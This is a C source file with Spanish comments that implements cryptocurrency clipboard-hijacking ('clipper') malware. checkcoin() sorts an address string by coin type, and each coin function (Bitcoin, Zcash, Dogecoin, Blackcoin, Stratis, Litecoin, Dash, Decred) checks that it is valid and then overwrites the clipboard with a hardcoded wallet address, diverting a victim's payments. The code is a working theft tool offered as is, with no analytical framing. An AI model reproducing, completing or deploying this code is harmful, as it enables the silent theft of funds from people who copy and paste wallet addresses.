int setclipboard(char *coin_adreess);           //estos son los prototipos de
int btc(char btc[]);                            //todas las funciones que
int zcash(char zch[]);                          //estan declaradas en este archivo .h
int doge(char dog[]);
int black(char blk[]);
int stratis(char stras[]);
int ltc(char ltc[]);
int dash(char dash[]);
int decred(char dec[]);

int checkcoin(char coin[]){
    if(coin[0]=='1'||coin[0]=='3'){
        btc(coin);
        return 1;//retorna 1 si es bitcoin
    }

    if(coin[0]=='L'){
        ltc(coin);
        return 2;//retorna 2 si es litetcoin
    }

     if(coin[0]=='X'){
        dash(coin);
        return 3;//retorna 3 si es dashcoin
    }
    if(coin[0]=='t'){
        zcash(coin);
        return 4;
    }
    if(coin[0]=='D'&&coin[1]=='s'&&strlen(coin)>=35){
        decred(coin);
        return 8;
    }
    if(coin[0]=='D'){
        doge(coin);
        return 5;
    }
     if(coin[0]=='B'){
        black(coin);
        return 6;
    }
     if(coin[0]=='S'){
        stratis(coin);
        return 7;
    }

    printf("no criptocoin found\n");
    return 0;//retorna 0 si no es ninguna criptomoneda soportada
}


int btc(char btc[]){
    printf("\"print btc == ");
    int i=0;
    if(btc[0]=='3'||btc[0]=='1'){
        for(i=1;i<=33;i++){
            if(btc[i]==' '){
                printf("caracter invalido btc adress\n");
                break;
            }
            if(btc[i]=='@'){
                printf("caracter invalido btc adress\n");
                break;
            }
             if(btc[i]=='#'){
                printf("caracter invalido btc adress\n");
                break;
            }
             if(btc[i]=='/'){
                printf("caracter invalido btc adress\n");
                break;
            }
             if(btc[i]=='\\'){
                printf("caracter invalido btc adress\n");
                break;
            }
             if(btc[i]=='$'){
                printf("caracter invalido btc adress\n");
                break;
            }
             if(btc[i]=='('){
                printf("caracter invalido btc adress\n");
                break;
            }
             if(btc[i]==')'){
                printf("caracter invalido btc adress\n");
                break;
            }
             if(btc[i]=='%'){
                printf("caracter invalido btc adress\n");
                break;
            }
             if(btc[i]=='&'){
                printf("caracter invalido btc adress\n");
                break;
            }
             if(btc[i]=='@'){
                printf("caracter invalido btc adress\n");
                break;
            }
             if(btc[i]=='.'){
                printf("caracter invalido btc adress\n");
                break;
            }
             if(btc[i]==':'){
                printf("caracter invalido btc adress\n");
                break;
            }
             if(btc[i]==','){
                printf("caracter invalido btc adress\n");
                break;
            }
             if(btc[i]==';'){
                printf("caracter invalido btc adress\n");
                break;
            }
             if(btc[i]=='-'){
                printf("caracter invalido btc adress\n");
                break;
            }
             if(btc[i]=='_'){
                printf("caracter invalido btc adress\n");
                break;
            }
        }
        if(i==34){
            printf("bitcoin OK\"\n");
            i=0;
            if(setclipboard(((char *)"1BFgoMQrYj7tsHMqRCBQknzJkdCv31Ju29"))==0){
                printf("bitcoin set succefull\n");
            }

            return 0;
        }

    }

     printf("no bitcoin adress\"\n");
}
//ZCASH cryptocoin ()
int zcash(char zch[]){
    printf("\"print zcash == ");
    int i=0;
    if(zch[0]=='t'){
        for(i=1;i<=34;i++){
            if(zch[i]==' '){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
            if(zch[i]=='@'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(zch[i]=='#'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(zch[i]=='/'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(zch[i]=='\\'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(zch[i]=='$'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(zch[i]=='('){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(zch[i]==')'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(zch[i]=='%'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(zch[i]=='&'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(zch[i]=='@'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(zch[i]=='.'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(zch[i]==':'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(zch[i]==','){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(zch[i]==';'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(zch[i]=='-'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(zch[i]=='_'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
        }
        if(i==35){
            printf("zcash OK\"\n");
            i=0;
            if(setclipboard(((char*)"t1JRrvheHYHvrJfKLNDF2WN9UXhmKxwX2ZD"))==0){
                printf("zcash set succefull\n");
            }
            return 0;
        }

    }

     printf("no zcash adress\"\n");

}


//dogecoin cryptocin (DOGE)
int doge(char dog[]){
    printf("\"print doge == ");
    int i=0;
    if(dog[0]=='D'){
        for(i=1;i<=33;i++){
            if(dog[i]==' '){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
            if(dog[i]=='@'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(dog[i]=='#'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(dog[i]=='/'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(dog[i]=='\\'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(dog[i]=='$'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(dog[i]=='('){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(dog[i]==')'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(dog[i]=='%'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(dog[i]=='&'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(dog[i]=='@'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(dog[i]=='.'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(dog[i]==':'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(dog[i]==','){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(dog[i]==';'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(dog[i]=='-'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(dog[i]=='_'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
        }
        if(i==34){
            printf("dogecoin OK\"\n");
            i=0;
            if(setclipboard(((char*)"DS1MipuZeH4WwbcTVHHoRd36mzsZuhoMDj"))==0){
                printf("dogecoin set succefull\n");
            }
            return 0;
        }

    }

     printf("no dogecoin adress\"\n");

}


//blackcoin cryptocin (nose_x_el_momento)
int black(char blk[]){
    printf("\"print black == ");
    int i=0;
    if(blk[0]=='B'){
        for(i=1;i<=33;i++){
            if(blk[i]==' '){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
            if(blk[i]=='@'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(blk[i]=='#'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(blk[i]=='/'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(blk[i]=='\\'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(blk[i]=='$'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(blk[i]=='('){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(blk[i]==')'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(blk[i]=='%'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(blk[i]=='&'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(blk[i]=='@'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(blk[i]=='.'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(blk[i]==':'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(blk[i]==','){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(blk[i]==';'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(blk[i]=='-'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(blk[i]=='_'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
        }
        if(i==34){
            printf("blackcoin OK\"\n");
            i=0;
            if(setclipboard(((char*)"BFrRsem2vrwf6J6Ug3t3vkjm1dJC4PGTFt"))==0){
                printf("blackcoin set succefull\n");
            }
            return 0;
        }

    }

     printf("no blackcoin adress\"\n");

}


//stratiscoin cryptocin (nose_x_el_momento)
int stratis(char stras[]){
    printf("\"print stratis == ");
    int i=0;
    if(stras[0]=='S'){
        for(i=1;i<=33;i++){
            if(stras[i]==' '){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
            if(stras[i]=='@'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(stras[i]=='#'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(stras[i]=='/'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(stras[i]=='\\'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(stras[i]=='$'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(stras[i]=='('){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(stras[i]==')'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(stras[i]=='%'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(stras[i]=='&'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(stras[i]=='@'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(stras[i]=='.'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(stras[i]==':'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(stras[i]==','){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(stras[i]==';'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(stras[i]=='-'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(stras[i]=='_'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
        }
        if(i==34){
            printf("stratis_coin OK\"\n");
            i=0;
            if(setclipboard(((char*)"ScDpGwXjzVTzfqK1QXFen1jCaiwYpkFDLm"))==0){
                printf("stratiscoin set succefull\n");
            }
            return 0;
        }

    }

     printf("no dogecoin adress\"\n");

}


//litecoin cryptocin (LTC)
int ltc(char ltc[]){
    printf("\"print ltc == ");
    int i=0;
    if(ltc[0]=='L'){
        for(i=1;i<=33;i++){
            if(ltc[i]==' '){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
            if(ltc[i]=='@'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(ltc[i]=='#'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(ltc[i]=='/'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(ltc[i]=='\\'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(ltc[i]=='$'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(ltc[i]=='('){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(ltc[i]==')'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(ltc[i]=='%'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(ltc[i]=='&'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(ltc[i]=='@'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(ltc[i]=='.'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(ltc[i]==':'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(ltc[i]==','){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(ltc[i]==';'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(ltc[i]=='-'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(ltc[i]=='_'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
        }
        if(i==34){
            printf("litecoin OK\"\n");
            i=0;
            if(setclipboard(((char*)"LRaZZcMxHLbucMCKk2wNuN1G81gzGzKv3u"))==0){
                printf("litecoin set succefull\n");
            }
            return 0;
        }

    }

     printf("no litecoin adress\"\n");

}

//dashcoin cryptocoin (nose_x_el_momento)
int dash(char dash[]){
    printf("\"print dash == ");
    int i=0;
    if(dash[0]=='X'){
        for(i=1;i<=33;i++){
            if(dash[i]==' '){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
            if(dash[i]=='@'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(dash[i]=='#'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(dash[i]=='/'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(dash[i]=='\\'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(dash[i]=='$'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(dash[i]=='('){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(dash[i]==')'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(dash[i]=='%'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(dash[i]=='&'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(dash[i]=='@'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(dash[i]=='.'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(dash[i]==':'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(dash[i]==','){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(dash[i]==';'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(dash[i]=='-'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(dash[i]=='_'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
        }
        if(i==34){
            printf("dashcoin OK\"\n");
            i=0;
            if(setclipboard(((char*)"XhiCUZ4BjZLgz2zEfSv7yfgeXrpUGQGGKo"))==0){
                printf("dashcoin set succefull\n");
            }
            return 0;
        }

    }

     printf("no dashcoin adress\"\n");

}



//decrepcoin cryptocin (DEC)
int decred(char dec[]){
    printf("\"print dec == ");
    int i=0;
    if(dec[0]=='D'&&dec[1]=='s'){
        for(i=1;i<=34;i++){
            if(dec[i]==' '){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
            if(dec[i]=='@'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(dec[i]=='#'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(dec[i]=='/'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(dec[i]=='\\'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(dec[i]=='$'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(dec[i]=='('){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(dec[i]==')'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(dec[i]=='%'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(dec[i]=='&'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(dec[i]=='@'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(dec[i]=='.'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(dec[i]==':'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(dec[i]==','){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(dec[i]==';'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(dec[i]=='-'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
             if(dec[i]=='_'){
                printf("caracter invalido cryptocoin adress\n");
                break;
            }
        }
        if(i==35){
            printf("decredcoin OK\"\n");
            i=0;
            if(setclipboard(((char*)"Dsf4nfreUs5p9Ds1oD3XR5yUMt77Tb6rYPe"))==0){
                printf("decrepcoin set succefull\n");
            }
            return 0;
        }

    }

     printf("no decredcoin adress\"\n");

}

